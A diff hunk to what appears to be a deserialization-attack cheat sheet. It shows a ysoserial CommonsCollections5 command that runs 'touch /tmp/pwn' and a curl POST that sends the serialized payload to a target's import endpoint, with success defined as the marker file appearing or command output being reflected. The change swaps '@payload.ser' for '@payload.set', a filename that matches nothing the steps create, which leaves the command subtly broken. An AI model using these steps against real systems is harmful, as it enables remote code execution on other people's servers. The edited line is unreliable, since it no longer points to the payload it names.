@@ -109,7 +109,7 @@ Send as cookie/body; success = `/tmp/pwn` present or command output reflected.
 ### Java ysoserial
 ```bash
 java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwn' | base64 -w0
-curl -X POST https://target.com/api/import -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser
+curl -X POST https://target.com/api/import -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.set
 ```
 
 ### PHP PHAR
